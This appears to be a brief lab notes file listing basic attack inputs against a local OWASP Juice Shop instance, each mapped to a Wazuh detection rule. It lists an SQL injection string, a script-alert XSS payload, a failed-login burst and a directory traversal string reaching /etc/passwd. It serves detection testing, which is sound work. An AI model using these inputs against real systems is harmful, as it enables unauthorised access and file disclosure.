# Juice Shop  Basic PoCs (Safe)
TARGET=http://127.0.0.1:3000

## SQLi (illustrative)
' OR 1=1 --
(Triggers Wazuh rule 100100)

## XSS (illustrative)
<script>alert(1)</script>

## Error burst
Multiple failed logins  Wazuh 100103

## Directory traversal
../../etc/passwd  Wazuh 100101
